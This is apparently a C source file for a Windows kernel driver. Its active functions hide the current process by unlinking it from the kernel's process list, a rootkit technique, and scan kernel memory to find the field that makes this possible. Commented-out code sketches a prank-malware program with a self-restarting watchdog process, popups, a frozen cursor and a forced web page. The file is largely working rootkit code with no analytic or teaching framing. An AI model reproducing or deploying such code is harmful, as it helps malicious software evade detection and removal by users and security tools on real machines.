#include "Driver.h"

#define ARG L"monitorproc"

//void monitor();

//VOID CALLBACK WaitOrTimerCallback(
//	_In_  PVOID lpParameter,
//	_In_  BOOLEAN TimerOrWaitFired
//)
//{
//	LPWSTR procn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * 2);
//	GetModuleFileName(NULL, procn, MAX_PATH * 2);
//	ShellExecuteW(NULL, NULL, procn, ARG, NULL, SW_SHOWDEFAULT);
//	LocalFree(procn);
//
//	monitor();
//}


//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
//
//	int argc;
//
//	popup("Process Started..", "Hi");
//	hidep();
//
//
//	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
//
//	//if (argc == 1 || lstrcmpW(argv[1], ARG)) {
//
//	//	
//	//	//CreateThread(NULL, NULL, &blink, NULL, 0, NULL);
//
//	//	LPWSTR procn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * 2);
//	//	GetModuleFileName(NULL, procn, MAX_PATH * 2);
//
//	//	ShellExecuteW(NULL, NULL, procn, ARG, NULL, SW_SHOWDEFAULT);
//	//	
//	//	Sleep(100000);
//	//	popup("lol", "Still using this computer?\n");
//	//	
//	//}
//	//else {
//
//	//	//argv[0] = (LPWSTR)L"Blabla";
//
//	//}
//
//	//monitor();
//
//	//while (popup("lol", "Still using this computer?\n") == IDYES) {}
//	//HANDLE lightsT = CreateThread(NULL, NULL, &FlashLEDs, NULL, 0, NULL);
//
//
//	//createNote(".\\note.txt", "WOowoowowooOOWoWOo", TRUE);
//
//
//	//makeSearch("https://www.youtube.com/watch?v=T5y_OcKDadQ");
//
//	//freezeCursor(15);
//
//
//
//	while (TRUE) Sleep(10000);
//	return 0;
//}

//void monitor() {
//
//	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);	// Get all current running processes
//
//	LPWSTR iprocn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 512);			// Get the current process's name
//	GetProcessImageFileNameW(GetCurrentProcess(), iprocn, 512);
//	iprocn = getImagNameW(iprocn);
//
//	HANDLE cproc;
//	char* cprocn = NULL;
//
//	PROCESSENTRY32 entry;
//	entry.dwSize = sizeof(entry);
//
//	Process32First(snap, &entry);
//
//	HANDLE nh;
//
//	do {
//
//		if (!lstrcmpW(iprocn, entry.szExeFile) && entry.th32ProcessID != GetCurrentProcessId()) {
//			cproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
//			RegisterWaitForSingleObject(&nh, cproc, WaitOrTimerCallback, NULL, INFINITE, WT_EXECUTEONLYONCE);
//			break;
//		}
//
//	} while (Process32Next(snap, &entry));
//
//
//	CloseHandle(snap);		// Snapshot will change each time a process is being created, make sure it is updated
//}



NTSTATUS hidep() {

	ULONG PID_OFFSET = find_eproc_pid();

	ULONG LIST_OFFSET = PID_OFFSET;

	LIST_OFFSET += sizeof(INT_PTR);


	LPVOID currentProcess = PsGetCurrentProcess();

	PLIST_ENTRY current = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
	PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)currentProcess + PID_OFFSET);

	PLIST_ENTRY prev;
	PLIST_ENTRY next;

	prev = current->Blink;
	next = current->Flink;

	prev->Flink = next;
	next->Blink = prev;

	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
	current->Blink = (PLIST_ENTRY)&current->Flink;
	current->Flink = (PLIST_ENTRY)&current->Flink;

	return STATUS_SUCCESS;
}



ULONG find_eproc_pid() {

	ULONG pid_ofs = 0;					// The offset we're looking for
	int idx = 0;						// Index 
	ULONG pids[PROCAMOUNT];				// List of PIDs for our 3 processes
	PEPROCESS eprocs[PROCAMOUNT];		// Process list, will contain 3 processes

	// Select 3 process PIDs and get their EPROCESS Pointer
	for (int i = 16; idx < PROCAMOUNT; i += 4) {
		if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i, &eprocs[idx]))) {
			pids[idx++] = i;
		}
	}

	for (int i = 0x20; i < 0x300; i += 4) {
		if ((*(ULONG*)((UCHAR*)eprocs[0] + i) == pids[0])
			&& (*(ULONG*)((UCHAR*)eprocs[1] + i) == pids[1])
			&& (*(ULONG*)((UCHAR*)eprocs[2] + i) == pids[2]))
		{
			pid_ofs = i; break;
		}
	}
	
	ObDereferenceObject(eprocs[0]);
	ObDereferenceObject(eprocs[1]);
	ObDereferenceObject(eprocs[2]);


	return pid_ofs;
}